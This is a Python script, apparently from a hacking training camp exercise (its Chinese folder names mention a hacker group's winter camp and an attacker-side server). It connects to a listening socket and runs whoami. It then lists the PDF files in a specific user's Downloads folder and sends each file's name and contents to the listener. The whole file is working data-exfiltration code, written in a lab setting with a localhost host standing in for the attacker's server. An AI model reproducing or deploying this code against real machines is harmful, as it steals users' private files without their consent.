import struct, json
import socket, threading, os
from time import sleep

download_dir = r'D:\_icando\iwantto\駭客\駭客組寒訓 2020.02.26\socket_兩方攻擊\server攻擊方\no attck'
gd_client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
gd_client.connect(('127.0.0.1',8123))
# 儲存pdf
get_username = os.system("whoami")
get_data = os.system("C:&&cd C:/Users/hjom7356731/Downloads&&dir /b *.pdf > pdf_list.txt")
# print(get_data)

def send_file():
  file_list = open('C:/Users/hjom7356731/Downloads/pdf_list.txt', 'r')
  for i in file_list:
    file_name = i.rstrip('\n')
    with open('C:/Users/hjom7356731/Downloads/'+file_name, 'rb') as file:
      gd_client.send(file_name.encode())
      sleep(1)
      while True:
        data = file.read()
        # print(data)
        if data == bytes(''.encode()):
          gd_client.send('exit'.encode())
          sleep(1)
          break
        gd_client.send(data)
        sleep(1)

      print('File sent successfully.')






class one_send1 :
  cmd = 'hacker'
  if not cmd:pass
  gd_client.send(cmd.encode('utf-8'))
  send_file()
 
one_send1()
gd_client.close()